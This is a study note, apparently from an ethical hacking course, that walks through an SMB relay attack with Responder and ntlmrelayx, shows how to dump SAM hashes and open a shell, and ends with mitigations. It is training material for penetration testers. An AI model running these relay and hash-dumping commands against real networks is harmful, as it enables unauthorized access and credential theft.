___
### What is SMB Relay?
- Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access.

### Requirements 
- SMB signing must be disabled or not enforced on the target.
- Relayed user credentials must be admin on machine for any real value.

### Identify Hosts Without SMB Signing

```
nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
```
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025150646.png)

### SMB Relay

Step 1 : Run Responder
```
sudo mousepad /etc/responder/Responder.conf
```
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025150836.png)

Step 2 : Run Responder
```
sudo responder -I tun0 -dwP
```
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151048.png)

Step 3 : Set up your relay
```
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151158.png)
Step 4 : An Event Occurs...
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151309.png)

Step 5 : Win
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151426.png)

Other Wins 
```
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```
- We get an interactive shell with the SAM dump by using -i in the command.
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151709.png)

```
nc 127.0.0.1 11000
```
- We can connect to this machine, we can look at shares, we can look through the file system and we can do a lot of different stuff via the shell that we have created.
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151905.png)

- We can also do commands using the -c "whoami" for example and we can do more malicious things such as add a local user with admin access and have more control on the system but we dont need to do that as the SAM dump we get thats enough.
```
sudo ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```
![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025152349.png)

### Mitigation Strategies:
1 Enable SMB Signing on all devices
- Pro: completely stops the attack
- Con: Can cause performance issues with file copies
2 Disable NTLM authentication on network
- Pro: Completely stops the attack
- Con: If Kerberos stops working, Windows defaults back to NTLM
3 Account tiering:
- Pro: Limits domain admins to specific tasks( eg only log onto servers with need for DA)
- Con: Enforcing the policy may be difficult
4 Local admin restriction:
- Pro: Can prevent a lo of lateral movement
- Con: Potential increase in the amount of service desk tickets

